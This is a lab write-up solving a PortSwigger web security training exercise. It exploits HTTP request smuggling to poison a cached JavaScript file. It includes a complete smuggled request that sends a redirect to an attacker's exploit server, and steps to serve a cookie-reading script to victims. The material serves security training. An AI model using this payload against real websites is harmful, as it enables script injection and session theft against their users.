# Lab 13 — Exploiting HTTP request smuggling to perform web cache poisoning

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)

**Entry point:** `/post/next?postId=` redirects to the next post using the
**Host** header — smuggle it to poison a JS resource in the cache.

## Solution

1. Smuggle the redirect with your exploit server as Host:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

2. On the exploit server, create `/post` with content-type
   `text/javascript` containing `alert(document.cookie)`.
3. Immediately fetch `GET /resources/js/tracking.js` — it receives the
   redirect → your exploit server → cached. Repeat the pair until stable.
4. The victim imports tracking.js — lab solved.
